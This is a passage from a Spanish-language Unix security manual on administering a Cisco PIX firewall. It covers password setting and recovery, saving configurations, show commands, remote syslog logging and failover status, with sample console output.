&#x00A0;passwd&#x00A0;2KFQnbNIdI.2KYOU&#x00A0;encrypted
&#x00A0;dixie(config)#
</literallayout>
<!--l. 1555--><para>La cadena &#x2018;encrypted&#x2019; que aparece tras la contrase~na indica que se trata de una clave cifrada; tambi&#x00E9;n nos
puede resultar &#x00FA;til para asignar un password directamente en cifrado, en lugar de hacerlo en texto
claro:

     </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;passwd
&#x00A0;passwd&#x00A0;2KFQnbNIdI.2KYOU&#x00A0;encrypted
&#x00A0;dixie(config)#&#x00A0;passwd&#x00A0;/hVDnFhQPQc4lzN5&#x00A0;encrypted
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;passwd
&#x00A0;passwd&#x00A0;/hVDnFhQPQc4lzN5&#x00A0;encrypted
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;enable&#x00A0;password
&#x00A0;enable&#x00A0;password&#x00A0;2KFQnbNIdI.2KYOU&#x00A0;encrypted
&#x00A0;dixie(config)#&#x00A0;enable&#x00A0;password&#x00A0;&#x00A0;/hVDnFhQPQc4lzN5&#x00A0;encrypted
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;enable&#x00A0;password
&#x00A0;enable&#x00A0;password&#x00A0;/hVDnFhQPQc4lzN5&#x00A0;encrypted
&#x00A0;dixie(config)#
</literallayout>
<!--l. 1572--><para>En caso de p&#x00E9;rdida de la clave de acceso v&#x02CA;&#x0131;a telnet, no tenemos m&#x00E1;s que conectar al cortafuegos
mediante una conexi&#x00F3;n serie y, desde el modo privilegiado asignar una nueva contrase~na; si lo que
hemos perdido es la clave para situar al cortafuegos en modo privilegiado, el proceso
es algo m&#x00E1;s complicado: en este caso debemos descargar la utilidad PIX Password Lockout
Utility apropiada para nuestra versi&#x00F3;n de &#xFB01;rewall (que podemos ver con sh version), desde la
direcci&#x00F3;n
</para><section role="center"><title/>
<!--l. 1579--><para> http://www.cisco.com/warp/public/110/34.shtml</para></section>
<!--l. 1582--><para>Se trata de un &#xFB01;chero &#x2018;.bin&#x2019; que podemos transferir a un disquette mediante la orden dd:

     </para><literallayout role="verbatim">
&#x00A0;anita:~$&#x00A0;dd&#x00A0;if=np51.bin&#x00A0;of=/dev/fd0
&#x00A0;144+0&#x00A0;records&#x00A0;in
&#x00A0;144+0&#x00A0;records&#x00A0;out
&#x00A0;anita:~$
</literallayout>
<!--l. 1592--><para>Tenemos que arrancar con el disco al que hemos transferido este sistema, que nos autom&#x00E1;ticamente nos
preguntar&#x00E1; si queremos borrar las claves; le diremos que s&#x02CA;&#x0131; y reiniciaremos el cortafuegos, que
tendr&#x00E1; como contrase~na de acceso remoto &#x2018;cisco&#x2019; y no tendr&#x00E1; password para pasar al modo
privilegiado.
</para><!--l. 1597--><para>  <informalequation><graphic 
fileref="unixsec312x.gif"></graphic></informalequation> Cambios permanentes
<!--br/-->Cada vez que nuestro PIX se apague perder&#x00E1; su con&#xFB01;guraci&#x00F3;n y cargar&#x00E1; o bien una introducida en un diskette
(esto es s&#x00F3;lo teor&#x02CA;&#x0131;a, nunca nos ha funcionado correctamente) o bien la que est&#x00E1; grabada en su
memoria &#xFB02;ash; si deseamos que nuestros cambios sean permanentes hemos de grabarlos o en
disco o en memoria &#xFB02;ash , mediante la orden write (write floppy o write mem, en cada
caso):

     </para><literallayout role="verbatim">
&#x00A0;dixie#&#x00A0;write&#x00A0;mem
&#x00A0;Building&#x00A0;configuration...
&#x00A0;Cryptochecksum:&#x00A0;206a9447&#x00A0;17e7ec36&#x00A0;d53c98d2&#x00A0;22a06c5e
&#x00A0;[OK]
&#x00A0;dixie#&#x00A0;wr&#x00A0;floppy
&#x00A0;Building&#x00A0;configuration...
&#x00A0;[OK]
&#x00A0;dixie#
</literallayout>
<!--l. 1614--><para>Si lo que queremos es visualizar la con&#xFB01;guraci&#x00F3;n que vamos a grabar (la actual), podemos ejecutar la orden
write terminal, que la volcar&#x00E1; en pantalla; esto representa la con&#xFB01;guraci&#x00F3;n que se est&#x00E1; ejecutando en
estos momentos, cuyo resultado puede ser diferente del proporcionado por sh conf (este &#x00FA;ltimo muestra
la con&#xFB01;guraci&#x00F3;n que hemos cargado al arrancar).
</para><!--l. 1620--><para>  <informalequation><graphic 
fileref="unixsec313x.gif"></graphic></informalequation> Con&#xFB01;guraci&#x00F3;n de terminal
<!--br/-->Para recon&#xFB01;gurar el n&#x00FA;mero de l&#x02CA;&#x0131;neas de nuestra terminal de conexi&#x00F3;n, tanto en modo privilegiado como en
modo usuario, podemos usar la orden pager, que recibe como par&#x00E1;metro el n&#x00FA;mero de l&#x02CA;&#x0131;neas
deseado:

     </para><literallayout role="verbatim">
&#x00A0;dixie&#x003E;&#x00A0;show&#x00A0;pager
&#x00A0;pager&#x00A0;lines&#x00A0;24
&#x00A0;dixie&#x003E;&#x00A0;pager&#x00A0;30
&#x00A0;dixie&#x003E;&#x00A0;show&#x00A0;page
&#x00A0;pager&#x00A0;lines&#x00A0;30
&#x00A0;dixie&#x003E;
</literallayout>
<!--l. 1633--><para>Para con&#xFB01;gurar el n&#x00FA;mero de columnas de nuestra consola podemos utilizar el comando terminal; si esta
orden recibe como par&#x00E1;metro la palabra monitor, habilita la impresi&#x00F3;n de mensajes de syslog en nuestra
pantalla, mientras que si recibe como par&#x00E1;metro la palabra width modi&#xFB01;ca el n&#x00FA;mero de columnas. De nuevo,
para ver la con&#xFB01;guraci&#x00F3;n actual utilizaremos la orden show:

     </para><literallayout role="verbatim">
&#x00A0;dixie#&#x00A0;show&#x00A0;terminal
&#x00A0;
&#x00A0;Width&#x00A0;=&#x00A0;80,&#x00A0;monitor
&#x00A0;dixie#&#x00A0;terminal&#x00A0;width&#x00A0;90
&#x00A0;dixie#&#x00A0;show&#x00A0;terminal
&#x00A0;
&#x00A0;Width&#x00A0;=&#x00A0;90,&#x00A0;monitor
&#x00A0;dixie#
</literallayout>
<!--l. 1650--><para>
  </para></section><!--end subsubsection--><!--l. 1650--><section 
role="subsubsection"><title><anchor 
   id="x1-26900016.4.7"  ></anchor>Informaci&#x00F3;n del sistema</title>
<!--l. 1651--><para>  Las &#x00F3;rdenes que nos permiten obtener informaci&#x00F3;n del estado actual del PIX comienzan por la palabra
&#x2018;show&#x2019;; algunas de ellas son las siguientes:
     </para><itemizedlist>
     <listitem>
     <!--l. 1654--><para>show processes
     <!--br/-->Muestra los procesos que se est&#x00E1;n ejecutando en el cortafuegos.
     </para></listitem>
     <listitem>
     <!--l. 1656--><para>show version
     <!--br/-->Muestra informaci&#x00F3;n gen&#x00E9;rica sobre el &#xFB01;rewall, como la versi&#x00F3;n del software instalado en el PIX, el
     uptime del sistema, ciertos par&#x00E1;metros hardware, licencias, etc. Este es un ejemplo de dicha
     informaci&#x00F3;n:

         </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;version
&#x00A0;
&#x00A0;Cisco&#x00A0;Secure&#x00A0;PIX&#x00A0;Firewall&#x00A0;Version&#x00A0;5.1(2)
&#x00A0;Compiled&#x00A0;on&#x00A0;Tue&#x00A0;16-May-00&#x00A0;16:09&#x00A0;by&#x00A0;bhochuli
&#x00A0;Finesse&#x00A0;Bios&#x00A0;V3.3
&#x00A0;
&#x00A0;dixie&#x00A0;up&#x00A0;140&#x00A0;days&#x00A0;0&#x00A0;hours
&#x00A0;
&#x00A0;Hardware:&#x00A0;&#x00A0;&#x00A0;SE440BX2,&#x00A0;128&#x00A0;MB&#x00A0;RAM,&#x00A0;CPU&#x00A0;Pentium&#x00A0;II&#x00A0;349&#x00A0;MHz
&#x00A0;Flash&#x00A0;AT29C040A&#x00A0;@&#x00A0;0x300,&#x00A0;2MB
&#x00A0;BIOS&#x00A0;Flash&#x00A0;AM28F256&#x00A0;@&#x00A0;0xfffd8000,&#x00A0;32KB
&#x00A0;
&#x00A0;0:&#x00A0;ethernet0:&#x00A0;address&#x00A0;is&#x00A0;0090.279b.c9d2,&#x00A0;irq&#x00A0;11
&#x00A0;1:&#x00A0;ethernet1:&#x00A0;address&#x00A0;is&#x00A0;0090.279b.c848,&#x00A0;irq&#x00A0;10
&#x00A0;2:&#x00A0;ethernet2:&#x00A0;address&#x00A0;is&#x00A0;0090.279b.c759,&#x00A0;irq&#x00A0;15
&#x00A0;3:&#x00A0;ethernet3:&#x00A0;address&#x00A0;is&#x00A0;0090.279b.c84c,&#x00A0;irq&#x00A0;9
&#x00A0;
&#x00A0;Licensed&#x00A0;connections:&#x00A0;&#x00A0;&#x00A0;65536
&#x00A0;
&#x00A0;Serial&#x00A0;Number:&#x00A0;18018531&#x00A0;(0x112f0e3)
&#x00A0;Activation&#x00A0;Key:&#x00A0;0xfe1f8896&#x00A0;0xe1fcb1e2&#x00A0;0x3400545b&#x00A0;0x8f392616
&#x00A0;dixie(config)#
</literallayout>
     </listitem>
     <listitem>
     <!--l. 1685--><para>show interface
     <!--br/-->Muestra informaci&#x00F3;n detallada sobre cada uno de los interfaces de red del &#xFB01;rewall, de forma muy
     parecida al ifconfig de Unix.
     </para></listitem>
     <listitem>
     <!--l. 1688--><para>show conn
     <!--br/-->Muestra las conexiones activas a trav&#x00E9;s del cortafuegos.
     </para></listitem>
     <listitem>
     <!--l. 1690--><para>show history
     <!--br/-->Muestra las &#x00FA;ltimas &#x00F3;rdenes ejecutadas en l&#x02CA;&#x0131;nea de comandos, de una forma similar al hist&#x00F3;rico que casi
     todos los shells de Unix incorporan; la interfaz del PIX es muy similar a la de bash: Control&#x2013;W
     borra una palabra, Control&#x2013;E va al &#xFB01;nal de l&#x02CA;&#x0131;nea, Control-B al principio, Control&#x2013;R realiza b&#x00FA;squedas,
     los cursores recorren el hist&#x00F3;rico de &#x00F3;rdenes, etc.
     </para></listitem>
     <listitem>
     <!--l. 1696--><para>show &#xFB02;ashfs
     <!--br/-->Muestra informaci&#x00F3;n sobre el sistema de &#xFB01;cheros empotrado en la memoria &#xFB02;ash de la
     m&#x00E1;quina.
     </para></listitem>
     <listitem>
     <!--l. 1698--><para>show clock
     <!--br/-->Muestra la fecha y hora del sistema; podemos modi&#xFB01;car esta informaci&#x00F3;n mediante la orden
     clock:


         </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;sh&#x00A0;clock
&#x00A0;01:38:34&#x00A0;Jun&#x00A0;11&#x00A0;2001
&#x00A0;pixie(config)#&#x00A0;clock&#x00A0;set&#x00A0;03:30:00&#x00A0;Jun&#x00A0;11&#x00A0;2001
&#x00A0;pixie(config)#&#x00A0;sh&#x00A0;clock
&#x00A0;03:30:02&#x00A0;Jun&#x00A0;11&#x00A0;2001
&#x00A0;pixie(config)#
</literallayout>
     </listitem>
     <listitem>
     <!--l. 1711--><para>show con&#xFB01;gure
     <!--br/-->Muestra la con&#xFB01;guraci&#x00F3;n cargada al arrancar el cortafuegos (no tiene por qu&#x00E9; ser la que se est&#x00E1;
     ejecutando en estos momentos; esta se puede ver con wr t). Es el contenido de la memoria no
     vol&#x00E1;til.
     </para></listitem>
     <listitem>
     <!--l. 1715--><para>show failover
     <!--br/-->Muestra el estado del subsistema de tolerancia a fallos.
     </para></listitem>
     <listitem>
     <!--l. 1717--><para>show who
     <!--br/-->Muestra las conexiones establecidas v&#x02CA;&#x0131;a telnet con el cortafuegos.</para></listitem></itemizedlist>
<!--l. 1720--><para>
  </para></section><!--end subsubsection--></section><!--end subsection--><!--l. 1720--><section 
role="subsection"><title><abbrev role="title-mark">16.4.8</abbrev><anchor 
   id="x1-27000016.4.8"  ></anchor>El sistema de log remoto</title>
<!--l. 1721--><para>  El PIX Firewall registra los eventos que se producen en la m&#x00E1;quina en un sistema de log que podemos
visualizar en el propio cortafuegos mediante la orden sh log. Tambi&#x00E9;n podemos enviar los
registros a un sistema Unix que escuche peticiones de syslog remoto, indicando la interfaz
por la que se van a enviar los registros y la direcci&#x00F3;n del sistema remoto mediante logging
host:

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;logging&#x00A0;host&#x00A0;inside&#x00A0;192.168.63.22
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1733--><para>En el sistema donde deseemos enviar los registros, el demonio syslogd ha de estar escuchando peticiones
remotas (opci&#x00F3;n &#x2018;-r&#x2019; del programa), y en los cortafuegos intermedios ha de estar habilitado el tr&#x00E1;&#xFB01;co desde
el PIX al puerto 514 (UDP) de la m&#x00E1;quina Unix.
<!--br/-->
<!--br/-->Por defecto, PIX registra eventos m&#x00E1;s relacionados con el estado del failover que con la seguridad
de los sistemas y los posibles ataques que pueden sufrir. Esto genera una gran cantidad de
mensajes que pueden hacer crecer al &#xFB01;chero de log de una forma considerable con entradas de este
tipo:

     </para><literallayout role="verbatim">
&#x00A0;Jun&#x00A0;&#x00A0;6&#x00A0;09:46:37&#x00A0;192.168.63.156&#x00A0;%PIX-1-103003:&#x00A0;(Primary)&#x00A0;Other&#x00A0;firewall
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;network&#x00A0;interface&#x00A0;0&#x00A0;failed.
&#x00A0;Jun&#x00A0;&#x00A0;6&#x00A0;09:46:49&#x00A0;192.168.63.156&#x00A0;%PIX-1-103005:&#x00A0;(Primary)&#x00A0;Other&#x00A0;firewall
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;reporting&#x00A0;failure.
&#x00A0;Jun&#x00A0;&#x00A0;6&#x00A0;09:46:49&#x00A0;192.168.63.156&#x00A0;%PIX-1-105004:&#x00A0;(Primary)&#x00A0;Monitoring&#x00A0;on
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;interface&#x00A0;1&#x00A0;normal
&#x00A0;Jun&#x00A0;&#x00A0;6&#x00A0;09:51:04&#x00A0;192.168.63.156&#x00A0;%PIX-1-105009:&#x00A0;(Primary)&#x00A0;Testing&#x00A0;on&#x00A0;interface
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;Passed
</literallayout>
<!--l. 1754--><para>Para evitar registrar estos mensajes, en el cortafuegos podemos ejecutar la orden no logging message, que
recibe como par&#x00E1;metro el n&#x00FA;mero de mensaje que no queremos guardar; por ejemplo, si queremos evitar el
registro de la alerta PIX-1-103003, ejecutaremos:

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;no&#x00A0;logging&#x00A0;message&#x00A0;103003
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1764--><para>Si queremos lo contrario, volver a registrar el mensaje en el sistema remoto, ejecutaremos la misma orden
pero sin el &#x2018;no&#x2019; delante, o bien clear logging disabled, que habilita el registro de todos los
mensajes.

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;logging&#x00A0;message&#x00A0;103003
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1773--><para>Podemos ver los mensajes que no estamos registrando mediante el comando sh logging disabled:

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;sh&#x00A0;logging&#x00A0;disabled
&#x00A0;no&#x00A0;logging&#x00A0;message&#x00A0;105008
&#x00A0;no&#x00A0;logging&#x00A0;message&#x00A0;105009
&#x00A0;no&#x00A0;logging&#x00A0;message&#x00A0;103003
&#x00A0;no&#x00A0;logging&#x00A0;message&#x00A0;103004
&#x00A0;no&#x00A0;logging&#x00A0;message&#x00A0;103005
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1786--><para>A nosotros nos va a interesar m&#x00E1;s registrar eventos registrados con entradas y salidas al cortafuegos, y tambi&#x00E9;n
con tr&#x00E1;&#xFB01;co negado en el mismo. Para ello, podemos ver la facility y la severity de los mensajes de log en el
sistema Unix; la facility es siempre PIX, mientras que la severity es el n&#x00FA;mero siguiente en el c&#x00F3;digo de
mensaje registrado (de 1 a 7); por ejemplo, un mensaje con un c&#x00F3;digo como PIX-6-307002 corresponde a
una facility PIX y a una severity 6.
<!--br/-->
<!--br/-->Podemos con&#xFB01;gurar nuestro syslog.conf para registrar los eventos provenientes del PIX (para Unix, con
severity local4) en diferentes &#xFB01;cheros; lo m&#x00E1;s c&#x00F3;modo ser&#x00E1; registrar todos los eventos (ejecutando logging
trap debugging) con una facility 20 (logging facility 20), y luego denegar mensajes determinados &#x2013;
relativos al failover mediante no logging message.
  </para></section><!--end subsection--><!--l. 1799--><section 
role="subsection"><title><abbrev role="title-mark">16.4.9</abbrev><anchor 
   id="x1-27100016.4.9"  ></anchor>Failover</title>
<!--l. 1800--><para>  El sistema de alta disponibilidad implantado por PIX permite utilizar una unidad secundaria que tomar&#x00E1;
el control de las conexiones en caso de que la primaria falle; ambas unidades estar&#x00E1;n conectadas por un
cable serie (un RS&#x2013;232 modi&#xFB01;cado) que transmite a 9600 baudios, y cont&#x02CA;&#x0131;nuamente se intercambian
mensajes &#x2018;hello&#x2019; para que ambas puedan conocer el estado de la otra unidad. Si dos de
estos mensajes consecutivos &#x2013; se env&#x02CA;&#x0131;an a intervalos de 15 segundos &#x2013; no son recibidos en un
determinado tiempo, entra en juego el failover para comprobar cual de las dos unidades ha fallado y
transferir el control a la otra. Entonces cada unidad cambia de estado: la nueva unidad activa
asume las direcciones IP y MAC de la anterior y comienza a aceptar tr&#x00E1;&#xFB01;co, y la que antes era
la activa ahora asume los par&#x00E1;metros de la que no lo era; el resto de elementos de la red no
ve ning&#x00FA;n cambio en los dispositivos, por lo que no existen cambios o timeouts en las tablas
ARP.
<!--br/-->
<!--br/-->Si queremos saber el estado del failover (por ejemplo para ver cu&#x00E1;l es la unidad activa en un determinado
momento) hemos de ejecutar la orden sh failover:

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;sh&#x00A0;failover
&#x00A0;Failover&#x00A0;On
&#x00A0;Cable&#x00A0;status:&#x00A0;Normal
&#x00A0;Reconnect&#x00A0;timeout&#x00A0;0:00:00
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;This&#x00A0;host:&#x00A0;Primary&#x00A0;-&#x00A0;Active
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Active&#x00A0;time:&#x00A0;386520&#x00A0;(sec)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Interface&#x00A0;failover&#x00A0;(192.168.87.209):&#x00A0;Normal
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Interface&#x00A0;dmz1&#x00A0;(192.168.63.156):&#x00A0;Normal
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Interface&#x00A0;outside&#x00A0;(172.17.1.1):&#x00A0;Normal
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Interface&#x00A0;inside&#x00A0;(172.17.2.1):&#x00A0;Normal
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Other&#x00A0;host:&#x00A0;Secondary&#x00A0;-&#x00A0;Standby
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Active&#x00A0;time:&#x00A0;405&#x00A0;(sec)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Interface&#x00A0;failover&#x00A0;(192.168.87.210):&#x00A0;Normal
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Interface&#x00A0;dmz1&#x00A0;(192.168.63.157):&#x00A0;Normal
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Interface&#x00A0;outside&#x00A0;(172.17.1.2):&#x00A0;Normal
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Interface&#x00A0;inside&#x00A0;(172.17.2.2):&#x00A0;Normal
&#x00A0;
&#x00A0;Stateful&#x00A0;Failover&#x00A0;Logical&#x00A0;Update&#x00A0;Statistics
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Link&#x00A0;:&#x00A0;failover
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Stateful&#x00A0;Obj&#x00A0;&#x00A0;&#x00A0;&#x00A0;xmit&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;xerr&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;rcv&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;rerr
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;General&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;53081&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;50149&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;sys&#x00A0;cmd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;52067&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;50146&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;up&#x00A0;time&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;xlate&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;9&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcp&#x00A0;conn&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1005&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;3&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;udp&#x00A0;conn&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ARP&#x00A0;tbl&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;RIP&#x00A0;Tbl&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Logical&#x00A0;Update&#x00A0;Queue&#x00A0;Information
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Cur&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Max&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Total
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Recv&#x00A0;Q:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;50149
